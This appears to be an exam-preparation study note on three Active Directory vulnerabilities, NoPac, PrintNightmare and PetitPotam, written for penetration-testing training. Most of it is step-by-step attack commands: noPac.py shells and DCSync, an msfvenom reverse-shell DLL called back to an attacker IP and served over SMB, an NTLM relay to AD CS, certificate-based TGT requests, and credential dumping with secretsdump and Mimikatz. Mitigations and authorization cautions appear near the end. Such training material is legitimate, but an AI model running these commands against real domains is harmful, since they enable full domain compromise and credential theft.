# Bleeding Edge Vulnerabilities

> **Exam focus:** Recognize the vulnerability, understand the attack flow, identify prerequisites, and know the relevant tools and mitigations.

## 1. NoPac — SamAccountName Spoofing

**CVEs:** `CVE-2021-42278` and `CVE-2021-42287`

- Can allow privilege escalation from a standard domain user to **Domain Admin-level access** in vulnerable environments.
- Exploits computer-account `sAMAccountName` manipulation and Kerberos ticket behavior.
- Default `ms-DS-MachineAccountQuota` is often `10`, allowing authenticated users to add computer accounts. If set to `0`, this attack path can be blocked.
- Possible outcomes include a SYSTEM shell on a Domain Controller or credential extraction through DCSync.

### Scan for NoPac

```bash
sudo python3 scanner.py DOMAIN/USER:PASSWORD \
-dc-ip <DC_IP> -use-ldap
```

**Indicators of potential vulnerability:**
- A TGT is successfully obtained from the Domain Controller.
- `ms-DS-MachineAccountQuota` is greater than `0`.

### Obtain a Shell

```bash
sudo python3 noPac.py DOMAIN/USER:PASSWORD \
-dc-ip <DC_IP> -dc-host <DC_HOSTNAME> \
-shell --impersonate administrator -use-ldap
```

### DCSync with NoPac

```bash
sudo python3 noPac.py DOMAIN/USER:PASSWORD \
-dc-ip <DC_IP> -dc-host <DC_HOSTNAME> \
--impersonate administrator -use-ldap \
-dump -just-dc-user DOMAIN/administrator
```

### Important Notes

- NoPac may save Kerberos tickets (`.ccache`) on the attack host.
- The shell uses `smbexec.py`; use **full paths** rather than relying on `cd` to navigate directories.
- AV/EDR may block commands or detect the activity.
- `smbexec.py` creates services and temporary batch files, making it potentially noisy.

## 2. PrintNightmare

**CVEs:** `CVE-2021-34527` and `CVE-2021-1675`

- Vulnerabilities in the Windows **Print Spooler** service.
- Depending on the target and configuration, can enable remote code execution or privilege escalation.
- The HTB example demonstrates obtaining a SYSTEM shell on a Domain Controller.
- Exploitation may disrupt the Print Spooler service.

### Step 1: Check RPC Protocols

```bash
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
```

Look for:
- `MS-RPRN` — Print System Remote Protocol
- `MS-PAR` — Print System Asynchronous Remote Protocol

### Step 2: Prepare the Exploit

The HTB example uses the `cube0x0` exploit and a compatible version of Impacket.

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

### Step 3: Generate a DLL Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > payload.dll
```

### Step 4: Host the Payload over SMB

```bash
sudo smbserver.py -smb2support ShareName /path/to/payload.dll
```

### Step 5: Start the Metasploit Handler

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

### Step 6: Execute the Exploit

```bash
sudo python3 CVE-2021-1675.py DOMAIN/USER:PASSWORD@<DC_IP> \
'\\<ATTACKER_IP>\ShareName\payload.dll'
```

**Success indicator:** A Meterpreter session opens, and `whoami` returns:

```text
nt authority\system
```

**Exam reminder:** The SMB share hosts the DLL, while the Metasploit handler receives the reverse connection.

## 3. PetitPotam — MS-EFSRPC

**CVE:** `CVE-2021-36942`

- Exploits MS-EFSRPC to coerce a Domain Controller into authenticating to an attacker-controlled host using NTLM.
- Can lead to domain compromise when combined with **NTLM relay to AD CS Web Enrollment**.
- The attack chain described by HTB does not require initial domain authentication.

### Attack Flow

1. Start `ntlmrelayx.py` targeting the CA's Web Enrollment endpoint.
2. Use the `DomainController` certificate template.
3. Trigger Domain Controller authentication with PetitPotam.
4. Relay authentication to AD CS and obtain a base64-encoded certificate.
5. Use the certificate to request a Domain Controller TGT.
6. Use the TGT for DCSync and retrieve privileged account hashes.

### Step 1: Start NTLM Relay to AD CS

```bash
sudo ntlmrelayx.py -debug -smb2support \
--target http://<CA_HOST>/certsrv/certfnsh.asp \
--adcs --template DomainController
```

### Step 2: Trigger Authentication

```bash
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
```

A response such as `Attack worked!` indicates that authentication coercion succeeded; confirm the relay output as well.

### Step 3: Request a TGT Using the Certificate

Using PKINITtools:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py \
DOMAIN/<DC_MACHINE_ACCOUNT>$ \
-pfx-base64 <BASE64_CERTIFICATE> dc.ccache
```

The tool saves the TGT to `dc.ccache`.

### Step 4: Use the Cached TGT

```bash
export KRB5CCNAME=dc.ccache
klist
```

Confirm that the cache contains a TGT for the domain:

```text
krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL
```

### Step 5: Perform DCSync

```bash
secretsdump.py -just-dc-user DOMAIN/administrator \
-k -no-pass '<DC_MACHINE_ACCOUNT>$'@<DC_FQDN>
```

This can retrieve the specified account's NTLM hash and Kerberos keys.

### Alternative: Windows Pass-the-Ticket

Rubeus can request a TGT using the certificate and inject it into the current logon session:

```powershell
.\Rubeus.exe asktgt /user:<DC_MACHINE_ACCOUNT>$ /certificate:<BASE64_CERTIFICATE> /ptt
```

Verify cached tickets:

```powershell
klist
```

With an appropriate privileged ticket, DCSync can be performed using Mimikatz:

```text
lsadump::dcsync /user:DOMAIN\krbtgt
```

## 4. PetitPotam / AD CS Mitigations

- Apply the patch for `CVE-2021-36942`.
- Enable **Extended Protection for Authentication (EPA)**.
- Require SSL for AD CS Web Enrollment and Certificate Enrollment Web Service.
- Disable NTLM authentication for Domain Controllers where feasible.
- Disable NTLM on AD CS servers using Group Policy.
- Disable NTLM for IIS on AD CS servers where the relevant enrollment services are used.

> **Important:** Patching PetitPotam alone does not eliminate every AD CS attack path.

## 5. Quick Exam Revision

| Vulnerability | CVE(s) | Key Component | Potential Impact |
|---|---|---|---|
| NoPac | `CVE-2021-42278`, `CVE-2021-42287` | SAM + Kerberos PAC | Domain privilege escalation |
| PrintNightmare | `CVE-2021-34527`, `CVE-2021-1675` | Print Spooler | Remote code execution / SYSTEM |
| PetitPotam | `CVE-2021-36942` | MS-EFSRPC + NTLM relay | AD CS abuse, DC impersonation, DCSync |

### Key Tools

| Tool | Purpose |
|---|---|
| `scanner.py` | Check for NoPac exposure |
| `noPac.py` | Exploit NoPac |
| `rpcdump.py` | Enumerate exposed RPC protocols |
| `CVE-2021-1675.py` | PrintNightmare exploitation |
| `smbserver.py` | Host payloads over SMB |
| `ntlmrelayx.py` | Relay authentication to AD CS |
| `PetitPotam.py` | Coerce authentication from a Domain Controller |
| `gettgtpkinit.py` | Request a TGT using a certificate |
| `secretsdump.py` | Perform DCSync / extract domain secrets |
| `Rubeus.exe` | Request and inject Kerberos tickets |
| `mimikatz.exe` | Perform DCSync using `lsadump::dcsync` |

### Operational Cautions

- These techniques can trigger AV/EDR alerts and cause service disruption.
- NoPac and PrintNightmare may be noisy; PetitPotam relies on a relayable authentication path and vulnerable/misconfigured AD CS.
- Validate authorization, record findings, and assess operational impact before testing.
